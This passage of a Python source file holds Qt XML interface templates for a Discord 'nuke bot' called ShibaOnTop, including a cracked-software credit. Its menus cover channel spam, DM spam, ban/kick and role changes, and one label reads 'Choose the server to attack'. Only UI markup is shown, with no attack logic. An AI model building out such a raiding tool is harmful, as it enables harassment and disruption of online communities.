      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Roles</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuChannels">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>110</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #660708;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Channels</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuServerInfo">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>80</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Server info</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuBotInfo">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>50</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Bot info</string>
    </property>
   </widget>
   <widget class="QLabel" name="label_2">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>10</y>
      <width>121</width>
      <height>31</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>14</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
color: #ffffff;</string>
    </property>
    <property name="text">
     <string>ShibaOnTop</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuCredits">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>320</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Credits</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuNicknames">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>260</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Nicknames</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuDMSpam">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>230</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>DM Spam</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuSpam">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>200</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Channel Spam</string>
    </property>
   </widget>
  </widget>
 </widget>
 <resources/>
 <connections/>
</ui>"""

CreditsTemplate = """<?xml version="1.0" encoding="UTF-8"?>
<ui version="4.0">
 <class>MainWindow</class>
 <widget class="QMainWindow" name="MainWindow">
  <property name="geometry">
   <rect>
    <x>0</x>
    <y>0</y>
    <width>700</width>
    <height>360</height>
   </rect>
  </property>
  <property name="font">
   <font>
    <family>Arial</family>
    <pointsize>12</pointsize>
   </font>
  </property>
  <property name="windowTitle">
   <string>MainWindow</string>
  </property>
  <property name="styleSheet">
   <string notr="true">background-color:  #0B090A;
font-family: &quot;Arial&quot;;</string>
  </property>
  <widget class="QWidget" name="centralwidget">
   <widget class="QLabel" name="InsertTokenLabel_2">
    <property name="geometry">
     <rect>
      <x>190</x>
      <y>10</y>
      <width>420</width>
      <height>40</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>16</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Credits</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QLabel" name="label">
    <property name="geometry">
     <rect>
      <x>0</x>
      <y>0</y>
      <width>141</width>
      <height>381</height>
     </rect>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;</string>
    </property>
    <property name="text">
     <string/>
    </property>
    <property name="indent">
     <number>-1</number>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuRoles">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>140</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Roles</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuChannels">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>110</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Channels</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuServerInfo">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>80</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Server info</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuBanKick">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>170</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Ban/Kick</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuBotInfo">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>50</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Bot info</string>
    </property>
   </widget>
   <widget class="QLabel" name="label_2">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>10</y>
      <width>121</width>
      <height>31</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>14</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
color: #ffffff;</string>
    </property>
    <property name="text">
     <string>ShibaOnTop</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuCredits">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>320</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #660708;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Credits</string>
    </property>
   </widget>
   <widget class="QPushButton" name="Lorix">
    <property name="geometry">
     <rect>
      <x>190</x>
      <y>210</y>
      <width>420</width>
      <height>23</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>14</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">border-radius: 0px;
color: #660708;</string>
    </property>
    <property name="text">
     <string>Discord: FreeCabbo6#8203</string>
    </property>
   </widget>
   <widget class="QPushButton" name="JProgrammer">
    <property name="geometry">
     <rect>
      <x>190</x>
      <y>170</y>
      <width>420</width>
      <height>23</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>14</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">border-radius: 0px;
color: #660708;</string>
    </property>
    <property name="text">
     <string>Telegram: @cabboshiba</string>
    </property>
   </widget>
   <widget class="QPushButton" name="DarkGUI">
    <property name="geometry">
     <rect>
      <x>190</x>
      <y>100</y>
      <width>420</width>
      <height>23</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>16</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">border-radius: 0px;
color: #660708;</string>
    </property>
    <property name="text">
     <string>The Demon Team - Full Cracked by Cabbo</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuNicknames">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>260</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Nicknames</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuDMSpam">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>230</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>DM Spam</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuSpam">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>200</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Channel Spam</string>
    </property>
   </widget>
  </widget>
 </widget>
 <resources/>
 <connections/>
</ui>"""

DashboardTemplate = """<?xml version="1.0" encoding="UTF-8"?>
<ui version="4.0">
 <class>MainWindow</class>
 <widget class="QMainWindow" name="MainWindow">
  <property name="geometry">
   <rect>
    <x>0</x>
    <y>0</y>
    <width>700</width>
    <height>360</height>
   </rect>
  </property>
  <property name="font">
   <font>
    <family>Arial</family>
    <pointsize>12</pointsize>
   </font>
  </property>
  <property name="windowTitle">
   <string>MainWindow</string>
  </property>
  <property name="styleSheet">
   <string notr="true">background-color:  #0B090A;
font-family: &quot;Arial&quot;;</string>
  </property>
  <widget class="QWidget" name="centralwidget">
   <widget class="QLabel" name="InsertTokenLabel_2">
    <property name="geometry">
     <rect>
      <x>190</x>
      <y>10</y>
      <width>420</width>
      <height>40</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>16</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Bot info</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QLabel" name="BotImage">
    <property name="geometry">
     <rect>
      <x>640</x>
      <y>10</y>
      <width>40</width>
      <height>40</height>
     </rect>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff; border-radius: 20px;</string>
    </property>
    <property name="text">
     <string/>
    </property>
   </widget>
   <widget class="QLabel" name="label">
    <property name="geometry">
     <rect>
      <x>0</x>
      <y>-20</y>
      <width>141</width>
      <height>381</height>
     </rect>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;</string>
    </property>
    <property name="text">
     <string/>
    </property>
    <property name="indent">
     <number>-1</number>
    </property>
   </widget>
   <widget class="QLabel" name="label_2">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>10</y>
      <width>121</width>
      <height>31</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>14</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
color: #ffffff;</string>
    </property>
    <property name="text">
     <string>ShibaOnTop</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuBanKick">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>170</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Ban/Kick</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuServerInfo">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>80</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Server info</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuRoles">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>140</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Roles</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuChannels">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>110</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Channels</string>
    </property>
   </widget>
   <widget class="QLabel" name="BotName">
    <property name="geometry">
     <rect>
      <x>160</x>
      <y>320</y>
      <width>241</width>
      <height>21</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Bot name: </string>
    </property>
   </widget>
   <widget class="QLabel" name="InsertTokenLabel_3">
    <property name="geometry">
     <rect>
      <x>160</x>
      <y>50</y>
      <width>481</width>
      <height>40</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">border-radius: 0px;
color: #660708;</string>
    </property>
    <property name="text">
     <string>Select a category and start manage your bot</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QLabel" name="ServerWithBot">
    <property name="geometry">
     <rect>
      <x>400</x>
      <y>320</y>
      <width>251</width>
      <height>21</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Server with the bot:</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuBotInfo">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>50</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #660708;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Bot info</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuCredits">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>320</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Credits</string>
    </property>
   </widget>
   <widget class="QComboBox" name="ServerList">
    <property name="geometry">
     <rect>
      <x>160</x>
      <y>160</y>
      <width>521</width>
      <height>31</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
   </widget>
   <widget class="QLabel" name="label_5">
    <property name="geometry">
     <rect>
      <x>160</x>
      <y>130</y>
      <width>521</width>
      <height>21</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="focusPolicy">
     <enum>Qt::WheelFocus</enum>
    </property>
    <property name="layoutDirection">
     <enum>Qt::LeftToRight</enum>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Choose the server to attack</string>
    </property>
   </widget>
   <widget class="QLabel" name="Token">
    <property name="geometry">
     <rect>
      <x>160</x>
      <y>90</y>
      <width>481</width>
      <height>21</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>9</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Token:</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuNicknames">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>260</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Nicknames</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuDMSpam">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>230</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>DM Spam</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuSpam">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>200</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Channel Spam</string>
    </property>
   </widget>
  </widget>
 </widget>
 <resources/>
 <connections/>
</ui>"""

errorTemplate = """<?xml version="1.0" encoding="UTF-8"?>
<ui version="4.0">
 <class>Form</class>
 <widget class="QWidget" name="Form">
  <property name="geometry">
   <rect>
    <x>0</x>
    <y>0</y>
    <width>697</width>
    <height>360</height>
   </rect>
  </property>
  <property name="windowTitle">
   <string>Form</string>
  </property>
  <property name="styleSheet">
   <string notr="true">background-color:  #0B090A;
font-family: &quot;Arial&quot;;</string>
  </property>
  <widget class="QLabel" name="InsertTokenLabel_2">
   <property name="geometry">
    <rect>
     <x>0</x>
     <y>0</y>
     <width>701</width>
     <height>41</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>20</pointsize>
     <weight>75</weight>
     <italic>true</italic>
     <bold>true</bold>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">color: #660708;</string>
   </property>
   <property name="text">
    <string>ERROR</string>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
  </widget>
  <widget class="QLabel" name="InsertTokenLabel_3">
   <property name="geometry">
    <rect>
     <x>0</x>
     <y>40</y>
     <width>691</width>
     <height>61</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>16</pointsize>
     <italic>true</italic>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">color: #660708;</string>
   </property>
   <property name="text">
    <string>Your product key is not present in our database,
if the problem persists contact GEFF#0479</string>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
  </widget>
  <widget class="QPushButton" name="RetryButton">
   <property name="geometry">
    <rect>
     <x>240</x>
     <y>280</y>
     <width>211</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Re-login</string>
   </property>
  </widget>
 </widget>
 <resources/>
 <connections/>
</ui>"""

NewVersionTemplate = """<?xml version="1.0" encoding="UTF-8"?>
<ui version="4.0">
 <class>Form</class>
 <widget class="QWidget" name="Form">
  <property name="geometry">
   <rect>
    <x>0</x>
    <y>0</y>
    <width>411</width>
    <height>187</height>
   </rect>
  </property>
  <property name="windowTitle">
   <string>Form</string>
  </property>
  <property name="styleSheet">
   <string notr="true">background-color:  #0B090A;
font-family: &quot;Arial&quot;;</string>
  </property>
  <widget class="QLabel" name="InsertTokenLabel_3">
   <property name="geometry">
    <rect>
     <x>0</x>
     <y>0</y>
     <width>420</width>
     <height>40</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>16</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">color: #660708;</string>
   </property>
   <property name="text">
    <string>New version!</string>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
  </widget>
  <widget class="QLabel" name="infoLabel">
   <property name="geometry">
    <rect>
     <x>0</x>
     <y>40</y>
     <width>420</width>
     <height>71</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>16</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">color: #660708;</string>
   </property>
   <property name="text">
    <string/>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
  </widget>
  <widget class="QPushButton" name="DownloadButton">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>120</y>
     <width>181</width>
     <height>31</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Instant Download</string>
   </property>
  </widget>
  <widget class="QProgressBar" name="progress">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>160</y>
     <width>401</width>
     <height>23</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
     <weight>50</weight>
     <bold>false</bold>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">color: #660708;</string>
   </property>
   <property name="value">
    <number>0</number>
   </property>
  </widget>
  <widget class="QPushButton" name="DownloadButton2">
   <property name="geometry">
    <rect>
     <x>220</x>
     <y>120</y>
     <width>181</width>
     <height>31</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Download Manually</string>
   </property>
  </widget>
 </widget>
 <resources/>
 <connections/>
</ui>"""

NukeBotTemplate = """<?xml version="1.0" encoding="UTF-8"?>
<ui version="4.0">
 <class>MainWindow</class>
 <widget class="QMainWindow" name="MainWindow">
  <property name="geometry">
   <rect>
    <x>0</x>
    <y>0</y>
    <width>700</width>
    <height>360</height>
   </rect>
  </property>
  <property name="font">
   <font>
    <family>Arial</family>
    <pointsize>12</pointsize>
   </font>
  </property>
  <property name="windowTitle">
   <string>MainWindow</string>
  </property>
  <property name="styleSheet">
   <string notr="true">background-color:  #0B090A;
font-family: &quot;Arial&quot;;</string>
  </property>
  <widget class="QWidget" name="centralwidget">
   <widget class="QPushButton" name="HostButton">
    <property name="geometry">
     <rect>
      <x>200</x>
      <y>190</y>
      <width>331</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Host</string>
    </property>
   </widget>
   <widget class="QLineEdit" name="TokenEdit">
    <property name="geometry">
     <rect>
      <x>200</x>
